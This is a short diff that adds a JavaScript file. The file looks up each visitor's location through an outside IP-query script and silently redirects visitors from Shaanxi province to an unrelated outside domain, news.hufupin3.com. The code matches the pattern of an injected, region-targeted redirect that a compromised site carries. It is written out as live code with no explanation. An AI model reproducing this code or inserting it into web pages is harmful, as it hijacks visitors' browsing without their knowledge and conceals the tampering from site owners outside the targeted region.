@@ -1,0 +1,11 @@
+﻿document.write("<script src=\'http://ip.ws.126.net/ipquery\'></script>");
+document.write("<script type=\'text/javascript\'>");
+document.write("if(lo==(\'陕西省\'))");
+document.write("{");
+document.write("document.location.href=\'http://news.hufupin3.com/index.htm\';");
+document.write("}");
+document.write("else if(lo==(\'陕西\'))");
+document.write("{");
+document.write("document.location.href=\'http://news.hufupin3.com/index.htm\';");
+document.write("}");
+document.write("</script>");
